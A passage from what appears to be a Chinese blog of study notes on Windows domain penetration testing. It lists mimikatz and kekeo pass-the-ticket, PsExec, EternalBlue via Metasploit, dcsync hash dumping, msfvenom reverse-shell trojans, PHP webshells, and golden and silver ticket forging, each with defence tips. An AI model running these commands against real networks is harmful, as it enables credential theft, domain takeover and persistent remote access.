<h4 id="清除内存中的票据">清除内存中的票据</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>mimikatz &quot;kerberos::purge&quot;<br></code></pre></td></tr></table></figure>
<h4 id="将票据注入内存">将票据注入内存</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>mimikatz &quot;kerberos::ptt &lt;票据文件名&gt;&quot;<br></code></pre></td></tr></table></figure>
<h3 id="kekeo票据传递">kekeo票据传递</h3>
<p>kekeo不通过导出得到票据文件，而是通过用户名，域名，散列值生成一个</p>
<h4 id="生成票据文件">生成票据文件</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>kekeo &quot;tgt::ask /user:&lt;用户名&gt; /domain:&lt;域名&gt; /ntlm:&lt;散列值&gt;&quot;<br></code></pre></td></tr></table></figure>
<h4 id="清除内存中的票据-2">清除内存中的票据</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br><span class="hljs-meta">#</span><span class="bash"> 方法一</span><br>kerberos::purge<br><span class="hljs-meta">#</span><span class="bash"> 方法二</span><br>klist purge<br></code></pre></td></tr></table></figure>
<h4 id="将票据注入内存-2">将票据注入内存</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>kerberos:ptt &lt;票据文件名&gt; # run in kekeo<br></code></pre></td></tr></table></figure>
<h4 id="防范票据传递攻击">防范票据传递攻击</h4>
<ol>
<li>
<p>开启Windows Update功能，进行自动更新。</p>
</li>
<li>
<p>手动下载补丁包进行修复</p>
</li>
<li>
<p>对域内账号进行控制，禁止使用弱口令，及时、定期修改密码。</p>
</li>
<li>
<p>在服务器上安装反病毒软件，及时更新病毒库。</p>
</li>
</ol>
<h2 id="5-5">5.5</h2>
<h3 id="PsExec">PsExec</h3>
<p>**特点：**包含在PsTools工具包里面、可以在远程计算机上执行、可以将管理员权限提升到System权限以运行指定的程序</p>
<h4 id="获取System权限的Shell">获取System权限的Shell</h4>
<p>需要在建立了<code>ipc$</code>下进行运行下面命令</p>
<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dos"># <span class="hljs-built_in">cmd</span>、PowerShell<br>PsExec -acceptula \\&lt;远程计算机IP地址&gt; -s <span class="hljs-built_in">cmd</span>.exe <br></code></pre></td></tr></table></figure>
<blockquote>
<p>-acceptula：第一次运行PsExec会弹出确认对话框，使用该参数就不会弹出确认框</p>
<p>-s：以System权限运行进程，如果不加此参数则会得到一个<code>Administrator</code>权限的Shell</p>
</blockquote>
<h4 id="攻击原理">攻击原理</h4>
<p>通过管道在远程目标机器上创建一个psexec服务，并在本地磁盘中生成一个名为“PSEXESVC”的二进制文件，然后，通过psexec服务运行命令，运行结束后删除服务。</p>
<h2 id="5-7">5.7</h2>
<h3 id="永恒之蓝漏洞利用攻击链">永恒之蓝漏洞利用攻击链</h3>
<p>使用msf来对其进行攻击</p>
<h4 id="启动msf">启动msf</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfconsole<br></code></pre></td></tr></table></figure>
<h4 id="使用模块">使用模块</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs msf">use auxiliary/scanner/smb/smb_ms17_010 		# 扫描模块<br>use exploit/windows/smb/ms17_010_eternalblue	# 攻击模块	<br></code></pre></td></tr></table></figure>
<h4 id="查看参数">查看参数</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs msf">show options<br></code></pre></td></tr></table></figure>
<h4 id="设置靶机地址段">设置靶机地址段</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs msf">set rhosts 192.168.100.1/24<br></code></pre></td></tr></table></figure>
<h4 id="设置线程数">设置线程数</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs msf">set threads 50<br></code></pre></td></tr></table></figure>
<h4 id="设置反弹payload（在攻击时设置此参数）">设置反弹payload（在攻击时设置此参数）</h4>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">set payload windows<span class="hljs-regexp">/x64/m</span>eterpreter/reverse_tcp<br></code></pre></td></tr></table></figure>
<h4 id="执行">执行</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs msf">exploit<br></code></pre></td></tr></table></figure>
<h4 id="后续渗透">后续渗透</h4>
<p>获取到靶机的<code>meterpreter shell</code>下可以进一步收集信息</p>
<p>查看当前shell权限：<code>getuid</code></p>
<p>获取用户散列值：<code>hashdump</code></p>
<p>获取命令行环境的shell：<code>shell</code></p>
<h4 id="防御方式">防御方式</h4>
<ul>
<li>禁用SMB协议，适用于Windows Vista及更高版本的操作系统</li>
<li>打开WindowsUpdate,或者手动安装KB2919355</li>
<li>使用防火墙阻止445端口的连接，或者使用进/岀站规则阻止445端口的连接</li>
<li>不要随意打开陌生的文件</li>
<li>安装杀毒软件，及时进行更新病毒库</li>
</ul>
<h2 id="5-9">5.9</h2>
<h3 id="DCOM">DCOM</h3>
<p>DCOM（分布式组件模型）：客户端程序可以通过DCOM,向网络中的另一台计算机上的服务端程序发送请求 基于COM(组件对象模型) ：同一台计算机的客户端服务端通信</p>
<h2 id="5-10">5.10</h2>
<h3 id="SPN">SPN</h3>
<p>微软给域内的每种资源分配不同的SPN(ServicePrincipalName)，即服务主体名称</p>
<p>SPN是服务实例(比如：HTTP、SMB、MySQL 等服务)的唯一标识符</p>
<h3 id="验证过程（参考Kerberos协议认证）">验证过程（参考<a href="##4.5">Kerberos协议认证</a>）</h3>
<ol>
<li>当用户需要访问MSSQL服务时，系统会以当前用户身份向域控制器查询SPN为”MSSQL”的记录。</li>
<li>找到该SPN记录后，用户会再次与KDC通信，将KDC发放的TGT作为身份凭据发送给KDC,并将需要访问的SPN发送给KDC。</li>
<li>KDC中的身份验证服务(AS)对TGT进行解密。</li>
<li>确认无误后，由TGS将一张允许访问该SPN所对应的服务的票据和该SPN所对应的服务的地址发送给用户。</li>
<li>用户使用该票据即可访问MSSQL服务。</li>
</ol>
<h3 id="常用命令-2">常用命令</h3>
<h4 id="注册SPN">注册SPN</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>setspn -A &lt;服务组件名称&gt;/&lt;主机名&gt;.&lt;域名&gt;:&lt;端口&gt;<br><span class="hljs-meta">#</span><span class="bash"> Example</span><br>setspn -A MSSQLSvc/computer1.pentest.com:1433<br></code></pre></td></tr></table></figure>
<p>将<code>-A</code>改为<code>-S</code>可以验证是否有重复的spn，注册SPN需要域管理员权限</p>
<h4 id="查询SPN">查询SPN</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br><span class="hljs-meta">#</span><span class="bash"> 当前域所有spn</span><br>setspn -q */*<br><span class="hljs-meta">#</span><span class="bash"> 指定域spn</span><br>setspn -T &lt;域名&gt; -q */*<br><span class="hljs-meta">#</span><span class="bash"> 指定域用户/主机的条目</span><br>setspn -L &lt;用户名&gt;<br></code></pre></td></tr></table></figure>
<h3 id="kerberoast攻击防范建议">kerberoast攻击防范建议</h3>
<ul>
<li>保证服务账号密码的长度超过25位</li>
<li>确保密码的随机性</li>
<li>定期修改服务账号的密码</li>
<li>保证默认的<code>AES256_HMAC</code>加密方式不能改为<code>RC4_HMAC_MD5</code></li>
<li>强制使用<code>AES256_HMAC</code>方式对<code>Kerberos</code>票据进行加密</li>
</ul>
<h1>第六章</h1>
<h2 id="6-1">6.1</h2>
<h3 id="ntdis-dit">ntdis.dit</h3>
<p>一个二进制文件，保存了活动目录中的所有数据，包括但不限于用户名，散列值，组，GPP,OU等与活动目录相关的信息，与SAM文件一样被操作系统锁定</p>
<p>保存位置为<code>%SystemRoot%\ntds\ntds.dit</code></p>
<h4 id="提取工具">提取工具</h4>
<p>ntdsutil.exe</p>
<p>vssadmin</p>
<p>vssown.vbs</p>
<p>ntdsutil的IFM</p>
<p>diskshadow</p>
<h4 id="防范方式">防范方式</h4>
<p>即监控卷影拷贝服务的使用情况</p>
<ul>
<li>监控卷影拷贝服务及任何涉及活动目录数据库文件（ntds.dit)的可疑操作行为。</li>
<li>监控System Event ID 7036(卷影拷贝服务进入运行状态的标志）的可疑实例，以及创建进程的事件。</li>
<li>监控创建diskshadow.exe及相关子进程的事件。</li>
<li>监控客户端设备中的diskshadow.exe实例创建事件。</li>
<li>通过日志监控新出现的逻辑驱动器映射事件</li>
</ul>
<h2 id="6-3">6.3</h2>
<h3 id="利用dcsync获取域散列值">利用dcsync获取域散列值</h3>
<p>dcsync是mimikatz中的一个功能，作用是利用VSS读取ntds.dit文件以获取域散列值</p>
<h4 id="常用命令-3">常用命令</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 导出所有用户名和散列值</span> <br>lsadump::dcsync /domain:&lt;域名&gt; /all /csv <br><span class="hljs-meta">#</span><span class="bash"> 导出指定用户散列值</span> <br>lsadump::dcsync /domain:&lt;域名&gt; /user:&lt;用户名&gt; <br><span class="hljs-meta">#</span><span class="bash"> 通过转储isass进程dump散列值</span> <br><span class="hljs-meta">#</span><span class="bash"> 域控上执行</span> <br>privilege::debug # 需要先提权 <br>lsadump::lsa /inject <br></code></pre></td></tr></table></figure>
<blockquote>
<p>注：前两个在域内所有计算机中都能用，最后的只能在域控上，前两个需要域管理员权限，最后的需要在mimikatz中提权</p>
</blockquote>
<h2 id="6-4">6.4</h2>
<h3 id="利用meterpreter会话获取域账号和域散列值">利用meterpreter会话获取域账号和域散列值</h3>
<h4 id="msfvenom生成木马程序">msfvenom生成木马程序</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;反弹的目的IP&gt; LPORT=&lt;反弹的目的端口&gt; -f exe &gt;shell.exe<br></code></pre></td></tr></table></figure>
<blockquote>
<p>-p：指定payload，要与<code>metersploit</code>中设置监听的payload完全一致</p>
<p>-f：指输出文件的格式</p>
<p>其中 LHOST 与 LPORT 一般指向攻击机的IP与监听的端口</p>
</blockquote>
<h4 id="攻击流程">攻击流程</h4>
<p>打开<code>metasploit</code>后</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">use exploit/multi/handler		# 使用模块 <br>set payload windows/x64/meterpreter/reverse_tcp # 设置payload，与木马中-p指定的完全相同 <br>set lhost &lt;攻击机ip&gt; set lport &lt;攻击机监听端口&gt; <br>exploit -j -z # 后台进行监听，等待靶机执行木马程序之后便能获取到meterpreter shell<br></code></pre></td></tr></table></figure>
<h4 id="防范建议">防范建议</h4>
<ul>
<li>开启Windows Update功能，进行自动更新。</li>
<li>手动下载补丁包进行修复。</li>
<li>对域内账号进行控制，禁止使用弱口令，及时、定期修改密码。</li>
<li>在服务器上安装反病毒软件，及时更新病毒库。</li>
</ul>
<h1>第七章</h1>
<h2 id="7-2">7.2</h2>
<p>域信任的作用是解决多域环境中的跨域资源共享问题</p>
<p>域环境不会无条件地接收来自其他域的凭证，只会接收来自受信任的域的凭证</p>
<h3 id="单向双向信任关系">单向双向信任关系</h3>
<p>单向信任是指在两个域之间创建单向的信任路径，即在一个方向上是信任流，在另一个方向上是访问流。</p>
<blockquote>
<p>例：若A域信任B域，那么B域内受信任的主体可以访问A域内信任B域的资源。但A域内的主体无法访问B域内的资源</p>
</blockquote>
<p>双向信任是指两个单向信任的组合，信任域和受信任域彼此信任，在两个方向上都有信任流和访问流。</p>
<blockquote>
<p>活动目录中的所有域信任关系都是双向可传递的</p>
<p>子域与父域也是双向可传递信任的</p>
</blockquote>
<h3 id="外部内部信任关系">外部内部信任关系</h3>
<p>同一域树中的两个或多个域之间的信任关系称为内部信任，该信任关系可传递</p>
<blockquote>
<p>例：有三个A域的子域：BA、CA、DA，BA域信任CA域，CA域信任DA域，则BA域也信任DA域</p>
</blockquote>
<p>外部信任是指两个不同林中的域的信任关系。 外部信任是不可传递的。 林信任关系可能是不可传递的，也可能是可传递的</p>
<h1>第八章</h1>
<h2 id="8-1">8.1</h2>
<h3 id="后门概念">后门概念</h3>
<p>通过绕过安全控制措施获取对程序或系统访问权限的方法。</p>
<blockquote>
<p>简单地说，后门就是一个留在目标主机上的软件，它可以使攻击者随时与目标主机进行连接</p>
</blockquote>
<h3 id="操作系统后门">操作系统后门</h3>
<p>**粘滞键后门：**通过替换粘滞键可执行文件，可以以System权限执行命令</p>
<p>**注册表注入后门：**将可执行文件写入到注册表键的启动项中，在登录时便能执行后门程序</p>
<p>**计划任务后门：**通过计划任务自动执行或生成后门程序</p>
<p>**meterpreter后门：**meterpreter自带，使用安装自启动方式的持久性后门程序</p>
<p>**Cymothoa后门：**将shellcode注入到现有进程中的后门程序</p>
<h3 id="WMI后门">WMI后门</h3>
<h4 id="特点-2">特点</h4>
<p>只能由管理员权限的用户运行</p>
<p>使用powershell编写</p>
<p>可以直接从新的WMI属性中读取和执行后门代码，给代码加密</p>
<p>无文件、无进程</p>
<h4 id="无文件、无进程的基本原理">无文件、无进程的基本原理</h4>
<p>无文件：将代码加密存储于WMI中,实现无文件</p>
<p>无进程：满足条件时，系统自动PowerShell进程执行后门程序，执行后进程消失，实现无进程</p>
<h2 id="8-2">8.2</h2>
<h3 id="Web后门">Web后门</h3>
<h4 id="weevely后门">weevely后门</h4>
<p>python编写的针对php的webshell</p>
<figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs verilog">weevely <span class="hljs-keyword">generate</span> &lt;密码&gt; &lt;生成文件路径&gt; <br></code></pre></td></tr></table></figure>
<p>如何连接webShell</p>
<figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bnf">weevely <span class="hljs-attribute">&lt;目标url,以文件名结尾&gt;</span> <span class="hljs-attribute">&lt;密码&gt;</span><br></code></pre></td></tr></table></figure>
<h4 id="webacoo后门">webacoo后门</h4>
<figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bnf">webacoo -g -o <span class="hljs-attribute">&lt;生成文件路径&gt;</span> <br></code></pre></td></tr></table></figure>
<p>如何连接webShell</p>
<figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bnf">webacoo -t -u <span class="hljs-attribute">&lt;目标url&gt;</span><br></code></pre></td></tr></table></figure>
<h2 id="8-3">8.3</h2>
<h3 id="域控制器权限持久化分析与防范">域控制器权限持久化分析与防范</h3>
<h4 id="DSRM目录恢复模式">DSRM目录恢复模式</h4>
<p>DSRM(DirectoryServicesRestoreMode,目录服务恢复模式）是Windows域环境中域控制器的安全模式启动选项。每个域控制器都有一个本地管理员账户（也就是DSRM账户）。DSRM允许管理员在域环境中出现故障或崩溃时还原、修复、重建活动目录数据库，使域环境的运行恢复正常。</p>
<h4 id="SSP">SSP</h4>
<p>SSP(Security Support Provider)是Windows操作系统安全机制的提供者。</p>
<p>简单地说，SSP就是一个DLL文件，主要用来实现Windows操作系统的身份认证功能</p>
<h4 id="SID-History">SID History</h4>
<p>每个用户都有自己的SID。SID的作用主要是跟踪安全主体控制用户连接资源时的访问权限。</p>
<p>SID History是在域迁移过程中需要使用的一个属性，用于在域迁移过程中保持域用户的访问权限。</p>
<h3 id="黄金票据">黄金票据</h3>
<h4 id="原理">原理</h4>
<p>在Kerberos认证中,Client通过AS(身份认证服务)认证后,AS会给Client一个 Logon Session Key和TGT,而Logon Session Key并不会保存在KDC中，krbtgt的NTLM Hash又是固定的,所以只要得到krbtgt的NTLM Hash，就可以伪造TGT和Logon Session Key来进入下一步Client与TGS的交互。而已有了金票后,就跳过AS验证,不用验证账户和密码,所以也不担心域管密码修改。</p>
<p>需要伪造内容：</p>
<ul>
<li>域管理员用户名</li>
<li>完整域名</li>
<li>域SID</li>
<li>krbtgt的 NTLM Hash 或 AES-256 值</li>
</ul>
<h4 id="导出Krbtgt的NTML-Hash">导出Krbtgt的NTML Hash</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">lsadump::dcsync /domain:&lt;域名&gt; /user:krbtgt<br></code></pre></td></tr></table></figure>
<p>上面使用<code>mimikatz</code>的<code>dcsync</code>来转储<code>ntds.dit</code>，指定<code>/user</code>参数可以只导出<code>krbtgt</code>账号信息</p>
<h4 id="获取域SID">获取域SID</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>wmic useraccount get name,sid<br></code></pre></td></tr></table></figure>
<h4 id="获取当前用户SID">获取当前用户SID</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>whoami /user<br></code></pre></td></tr></table></figure>
<h4 id="获取域管理员账户">获取域管理员账户</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>net group &quot;domain admins&quot; /domain<br></code></pre></td></tr></table></figure>
<h4 id="查询域名">查询域名</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>ipconfig /all<br></code></pre></td></tr></table></figure>
<h4 id="清空票据">清空票据</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">kerberos::purge<br></code></pre></td></tr></table></figure>
<h4 id="生成票据">生成票据</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 使用krbtgt NTLM Hash 生成</span><br>kerberos::golden /admin:Administrator /domain:&lt;域名称&gt; /sid:&lt;域SID&gt; /krbtgt:&lt;krbtgt的NTLM Hash&gt; /ticket:Administrator.kiribi<br><span class="hljs-meta">#</span><span class="bash"> 使用AES-256值生成</span><br>kerberos::golden /admin:Administrator /domain:&lt;域名称&gt; /sid:&lt;域SID&gt; /aes256:&lt;krbtgt的AES-256值&gt; /ticket:Administrator.kiribi<br></code></pre></td></tr></table></figure>
<h4 id="传递票据">传递票据</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">kerberos::ptt Administrator.kiribi<br></code></pre></td></tr></table></figure>
<h4 id="防御措施">防御措施</h4>
<p>管理员通常会修改域管理员的密码，但有时会忘记将krbtgt密码一并重置，所以，如果想防御Golden Ticket攻击，就需要将krbtgt密码<strong>重置两次</strong>。<br>
使用Golden Ticket伪造的用户可以是任意用户（即使这个用户不存在)。因为TGT的加密是由krbtgt完成的，所以，只要TGT被krbtgt账户和密码正确地加密，那么任意KDC使用krbtgt将TGT解密后，TGT中的所有信息都是可信的。只有在如下两种情况下才能修改krbtgt密码。</p>
<ul>
<li>域功能级别从Windows2000或Windows Server 2003提升至Windows Server 2008或WindowsServer 2012。在提升域功能的过程中，krbtgt 的密码会被自动修改。</li>
<li>用户自行进行安全检查和相关服务加固时会修改krbtgt的密码。</li>
</ul>
<h3 id="白银票据">白银票据</h3>
<h4 id="原理-2">原理</h4>
<p>黄金票据是伪造的TGT,那么白银票据就是伪造的ST。在Kerberos认证的第三步，Client带着ST和Authenticator向Server上的某个服务进行请求，Server接收到Client的请求之后,通过自己的Master Key 解密ST,从而获得 Session Key。通过 Session Key 解密 Authenticator,进而验证对方的身份,验证成功就让 Client 访问server上的指定服务了。所以我们只需要知道Server用户的Hash就可以伪造出一个ST，且不会经过KDC，但是伪造的门票只对部分服务起作用。</p>
<p>所需要条件：</p>
<ul>
<li>域名</li>
<li>域SID</li>
<li>目标服务器名</li>
<li>可利用的服务</li>
<li>服务账号的NTML HASH</li>
<li>需要伪造的用户名</li>
</ul>
<p>攻击方式与黄金票据相似</p>
<h4 id="获取服务账号名-服务账号Hash">获取服务账号名 &amp; 服务账号Hash</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>mimikatz &quot;privlige::debug&quot; &quot;sekurlsa::logonPasswords&quot;<br></code></pre></td></tr></table></figure>
<h4 id="票据制作">票据制作</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br><span class="hljs-meta">#</span><span class="bash"> 清除票据</span><br>klist purge  <br><span class="hljs-meta">#</span><span class="bash"> 票据生成</span><br>kerberos::golden /domain:域名 /sid:域sid /target:目标服务器 /service:目标服务 /rc4:目标服务器的hash /user:xxx用户名 /ptt<br><span class="hljs-meta">#</span><span class="bash"> Example</span><br>kerberos::golden /domain:cyber.com /sid:S-1-5-21-1923088019-4105411894-1236499359 /target:dc.cyber.com /service:cifs /rc4:45bdd23a3b9fc1c44a9fbb4081a70b30 /user:aaaa /ptt<br></code></pre></td></tr></table></figure>
<h3 id="黄金票据和白银票据区别">黄金票据和白银票据区别</h3>
<h4 id="获取的权限不同">获取的权限不同</h4>
<p>金票：伪造的TGT，可以获取任意Kerberos的访问权限</p>
<p>银票：伪造的ST，只能访问指定的服务，如CIFS</p>
<h4 id="认证流程不同">认证流程不同</h4>
<p>金票：与KDC交互，但不与AS交互</p>
<p>银票：不与KDC交互，直接访问Server</p>
<h4 id="加密方式不同">加密方式不同</h4>
<p>金票：由krbtgt NTLM Hash 加密</p>
<p>银票：由服务账号 NTLM Hash 加密</p>
<h3 id="万能密码">万能密码</h3>
<p>了解可以生成万能密码与域控建立IPC$</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/Web/" class="category-chain-item">Web</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>内网渗透学习笔记</div>
      <div>https://equinox-shame.github.io/2024/06/11/内网渗透测试/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>梓曰</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年6月11日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/02/29/%E7%AE%97%E6%B3%95%E5%B0%8F%E8%AE%B0%20%E2%80%94%20%E5%B7%AE%E5%88%86%E6%95%B0%E7%BB%84/" title="算法小记 —— 差分数组">
                        <span class="hidden-mobile">算法小记 —— 差分数组</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  <article id="comments" lazyload>
    
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"2aM6IUUWOeDGCZaDdRhrvLam-gzGzoHsz","appKey":"GQdXw2PjI9DScgw5QHVCZeYm","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":true,"serverURLs":"","emojiCDN":"//i0.hdslb.com/bfs/emote/","emojiMaps":{"脱单doge":"bf7e00ecab02171f8461ee8cf439c73db9797748.png","热":"4e58a2a6f5f1580ac33df2d2cf7ecad7d9ab3635.png","微笑":"685612eadc33f6bc233776c6241813385844f182.png","口罩":"3ad2f66b151496d2a5fb0a8ea75f32265d778dd3.png","doge":"3087d273a78ccaff4bb1e9972e2ba2a7583c9f11.png","妙啊":"b4cb77159d58614a9b787b91b1cd22a81f383535.png","OK":"4683fd9ffc925fa6423110979d7dcac5eda297f4.png","星星眼":"63c9d1a31c0da745b61cdb35e0ecb28635675db2.png","辣眼睛":"35d62c496d1e4ea9e091243fa812866f5fecc101.png","吃瓜":"4191ce3c44c2b3df8fd97c33f85d3ab15f4f3c84.png","滑稽":"d15121545a99ac46774f1f4465b895fe2d1411c3.png","呲牙":"b5a5898491944a4268360f2e7a84623149672eb6.png","打call":"431432c43da3ee5aab5b0e4f8931953e649e9975.png","歪嘴":"4384050fbab0586259acdd170b510fe262f08a17.png","调皮":"8290b7308325e3179d2154327c85640af1528617.png","翻白眼":"eba54707c7168925b18f6f8b1f48d532fe08c2b1.png","灵魂出窍":"43d3db7d97343c01b47e22cfabeca84b4251f35a.png","再见":"fc510306bae26c9aec7e287cdf201ded27b065b9.png","嗑瓜子":"28a91da1685d90124cfeead74622e1ebb417c0eb.png","笑哭":"c3043ba94babf824dea03ce500d0e73763bf4f40.png","藏狐":"ba0937ef6f3ccca85e2e0047e6263f3b4da37201.png","脸红":"0922c375da40e6b69002bd89b858572f424dcfca.png","给心心":"1597302b98827463f5b75c7cac1f29ea6ce572c4.png","嘟嘟":"abd7404537d8162720ccbba9e0a8cdf75547e07a.png","哦呼":"362bded07ea5434886271d23fa25f5d85d8af06c.png","喜欢":"8a10a4d73a89f665feff3d46ca56e83dc68f9eb8.png","酸了":"92b1c8cbceea3ae0e8e32253ea414783e8ba7806.png","嫌弃":"de4c0783aaa60ec03de0a2b90858927bfad7154b.png","大哭":"2caafee2e5db4db72104650d87810cc2c123fc86.png","害羞":"9d2ec4e1fbd6cb1b4d12d2bbbdd124ccb83ddfda.png","疑惑":"b7840db4b1f9f4726b7cb23c0972720c1698d661.png","喜极而泣":"485a7e0c01c2d70707daae53bee4a9e2e31ef1ed.png","奸笑":"bb84906573472f0a84cebad1e9000eb6164a6f5a.png","阴险":"ba8d5f8e7d136d59aab52c40fd3b8a43419eb03c.png","囧":"12e41d357a9807cc80ef1e1ed258127fcc791424.png","呆":"33ad6000d9f9f168a0976bc60937786f239e5d8c.png","大笑":"ca94ad1c7e6dac895eb5b33b7836b634c614d1c0.png","惊喜":"0afecaf3a3499479af946f29749e1a6c285b6f65.png"},"enableQQ":false},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
